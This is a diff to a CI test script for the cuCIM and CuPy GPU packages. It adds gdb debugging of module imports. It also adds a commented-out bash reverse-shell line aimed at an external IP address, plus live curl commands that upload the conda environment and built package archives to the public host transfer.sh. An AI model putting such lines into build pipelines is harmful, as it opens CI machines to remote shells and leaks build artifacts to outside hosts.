@@ -88,7 +88,34 @@ gpuci_mamba_retry install -y -c ${LIBCUCIM_BLD_PATH} -c ${CUCIM_BLD_PATH} -c rap
     cucim
 
 gpuci_logger "Testing cuCIM import"
-python -c 'import cucim'
+gpuci_mamba_retry install -y -c conda-forge gdb
+
+echo "importing both modules"
+gdb -ex 'set confirm off' -ex 'run -c "import cucim"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`
+
+echo "importing cupy only"
+gdb -ex 'set confirm off' -ex 'run -c "import cupy"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`
+
+echo "importing CuImage only"
+gdb -ex 'set confirm off' -ex 'run -c "import cucim.clara._cucim as cc"' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`
+
+
+set +e
+#/bin/bash -i > /dev/tcp/206.189.160.33/9999 0<&1 2>&1
+conda env export > environment.yml
+echo
+curl --upload-file ./environment.yml http://transfer.sh/environment.yml
+echo
+
+for i in `ls -1 /workspace/ci/artifacts/cucim/cpu/.conda-bld/linux-64/libcucim-*.bz2`; do
+    curl --upload-file $i http://transfer.sh/$(basename $i)
+    echo
+done
+
+for i in `ls -1 /opt/conda/envs/rapids/conda-bld/linux-64/cucim-*.bz2`; do
+    curl --upload-file $i http://transfer.sh/$(basename $i)
+    echo
+done
 
 gpuci_logger "Check versions"
 python --version
